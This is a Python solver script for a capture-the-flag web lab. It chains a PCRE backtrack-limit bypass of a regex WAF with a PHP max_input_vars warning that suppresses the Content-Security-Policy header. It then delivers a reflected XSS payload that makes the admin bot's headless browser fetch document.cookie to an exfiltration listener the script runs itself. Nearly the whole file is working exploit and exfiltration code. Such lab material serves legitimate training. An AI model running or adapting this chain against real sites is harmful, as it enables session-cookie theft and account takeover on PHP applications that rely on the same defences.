#!/usr/bin/env python3
"""
Solver for lab 04 -- "When security features make you less secure".

Chain:
  (A) PCRE pcre.backtrack_limit -- pad the note so the WAF's catastrophic
      regex exceeds its backtracking budget. preg_match() returns *false*,
      which the `if (preg_match(...)) block()` logic reads as "clean".
  (B) max_input_vars -- append >1000 GET parameters. PHP prints a
      startup Warning BEFORE index.php runs, so the header() that would
      emit `Content-Security-Policy: default-src 'none'` fails with
      "headers already sent". The CSP that was the last line of defence
      simply never ships, and the reflected XSS executes.

The admin bot (a real headless Chromium) opens the reported URL with the
flag in a cookie. The injected script exfiltrates document.cookie to a
listener this solver binds itself. Stdlib only.
"""
import http.client
import socket
import sys
import threading
import time
import urllib.parse

CHALLENGE = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
BOT = sys.argv[2] if len(sys.argv) > 2 else "http://bot:8080"

# Where the bot's browser reaches us. Must match this container's network
# alias (see docker-compose.yml -> solver.networks.lab.aliases).
LISTEN_HOST_FOR_BOT = "solver"
LISTEN_PORT = 9999

# The origin the admin bot will open. Chromium resolves `challenge` on the
# lab network; the bot's browser cookie is scoped to exactly this origin.
CHALLENGE_ORIGIN_FOR_BOT = "http://challenge"


def log(*a):
    print("[solve]", *a, flush=True)


# --------------------------------------------------------------------------
# exfil listener: a plain TCP socket that speaks just enough HTTP to make
# the browser's fetch() succeed and to capture the query string.
# --------------------------------------------------------------------------
class Exfil:
    def __init__(self, port):
        self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("0.0.0.0", port))
        self.srv.listen(16)
        self.srv.settimeout(1.0)
        self.hits = []
        self._stop = threading.Event()
        self.t = threading.Thread(target=self._loop, daemon=True)

    def start(self):
        self.t.start()

    def _loop(self):
        while not self._stop.is_set():
            try:
                conn, _ = self.srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._serve, args=(conn,), daemon=True).start()

    def _serve(self, conn):
        try:
            conn.settimeout(3.0)
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 65536:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            line = data.split(b"\r\n", 1)[0].decode("latin1", "replace")
            log("exfil hit:", line[:200])
            self.hits.append(line)
            body = b"ok"
            conn.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Access-Control-Allow-Origin: *\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: %d\r\n"
                b"Connection: close\r\n\r\n" % len(body)
                + body
            )
        except Exception as exc:
            log("exfil serve error:", repr(exc))
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def find_flag(self):
        for line in self.hits:
            try:
                q = urllib.parse.urlsplit(line.split(" ")[1]).query
                for _, v in urllib.parse.parse_qsl(q, keep_blank_values=True):
                    v = urllib.parse.unquote_plus(v)
                    if "PHRACK{" in v:
                        i = v.index("PHRACK{")
                        return v[i : v.index("}", i) + 1]
            except Exception:
                continue
        return None

    def stop(self):
        self._stop.set()
        try:
            self.srv.close()
        except Exception:
            pass


# --------------------------------------------------------------------------
# payload construction
# --------------------------------------------------------------------------
def build_exploit_url():
    # (A) padding that makes WAF rule #1 blow pcre.backtrack_limit.
    #     `<b` + a long run of spaces = catastrophic backtracking; the
    #     match aborts with PREG_BACKTRACK_LIMIT_ERROR -> preg_match()==false.
    pad = "<b" + " " * 200 + ">"

    # the actual XSS, smuggled right behind the padding.
    js = (
        "fetch('http://%s:%d/?c='+encodeURIComponent(document.cookie))"
        % (LISTEN_HOST_FOR_BOT, LISTEN_PORT)
    )
    note = pad + "<svg onload=" + js + ">"

    # (B) xss must be within the first max_input_vars entries, so it goes
    #     first; then >1000 junk params to trip the startup warning that
    #     cancels the CSP header.
    query = "xss=" + urllib.parse.quote(note, safe="")
    query += "&" + "&".join("a=%d" % i for i in range(1100))
    return CHALLENGE_ORIGIN_FOR_BOT + "/?" + query


# --------------------------------------------------------------------------
# talk to services
# --------------------------------------------------------------------------
def http_get(url, timeout=10):
    u = urllib.parse.urlsplit(url)
    conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=timeout)
    path = u.path + ("?" + u.query if u.query else "")
    conn.request("GET", path or "/")
    r = conn.getresponse()
    body = r.read().decode("utf-8", "replace")
    headers = {k.lower(): v for k, v in r.getheaders()}
    conn.close()
    return r.status, headers, body


def report(url, timeout=15):
    u = urllib.parse.urlsplit(BOT)
    conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=timeout)
    body = urllib.parse.urlencode({"url": url})
    conn.request(
        "POST", "/report", body,
        {"Content-Type": "application/x-www-form-urlencoded"},
    )
    r = conn.getresponse()
    txt = r.read().decode("utf-8", "replace")
    conn.close()
    return r.status, txt


def wait_up(base, tries=60):
    for _ in range(tries):
        try:
            s, _, _ = http_get(base + "/", timeout=5)
            if s in (200, 403):
                return True
        except Exception:
            pass
        time.sleep(1)
    return False


def wait_bot(tries=90):
    u = urllib.parse.urlsplit(BOT)
    for _ in range(tries):
        try:
            c = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=5)
            c.request("GET", "/health")
            r = c.getresponse()
            r.read()
            c.close()
            if r.status == 200:
                return True
        except Exception:
            pass
        time.sleep(1)
    return False


def sanity_checks(exploit_url):
    """prove the two primitives independently before involving the bot."""
    q = urllib.parse.urlsplit(exploit_url).query
    # rebuild a direct challenge URL from the same query
    direct = CHALLENGE + "/?" + q
    s, h, body = http_get(direct)
    csp = h.get("content-security-policy")
    log("direct fetch: status=%s csp=%r" % (s, csp))
    reflected = "onload=fetch(" in body
    log("payload reflected unescaped:", reflected)
    log("startup warning present:", "Input variables exceeded" in body)
    return csp is None and reflected


def main():
    log("challenge =", CHALLENGE, "| bot =", BOT)
    if not wait_up(CHALLENGE):
        log("challenge never came up")
        return 1
    if not wait_bot():
        log("bot never came up")
        return 1

    exploit_url = build_exploit_url()
    log("exploit url length:", len(exploit_url))

    # independent evidence that (A)+(B) both fire
    if sanity_checks(exploit_url):
        log("OK: WAF bypassed (regex false) AND CSP header suppressed")
    else:
        log("WARNING: sanity check unexpected, continuing to bot anyway")

    exfil = Exfil(LISTEN_PORT)
    exfil.start()
    log("exfil listener bound on 0.0.0.0:%d (bot reaches us as %s)"
        % (LISTEN_PORT, LISTEN_HOST_FOR_BOT))

    deadline = time.time() + 150
    attempt = 0
    while time.time() < deadline:
        attempt += 1
        st, txt = report(exploit_url)
        log("report attempt %d -> %s %s" % (attempt, st, txt.strip()))
        # give the headless browser time to open + fire onload + fetch
        for _ in range(20):
            flag = exfil.find_flag()
            if flag:
                log("captured cookie via headless browser")
                exfil.stop()
                print("FLAG: " + flag)
                return 0
            time.sleep(1)
        log("no exfil yet, retrying report ...")

    exfil.stop()
    log("timed out waiting for the admin bot")
    return 1


if __name__ == "__main__":
    sys.exit(main())
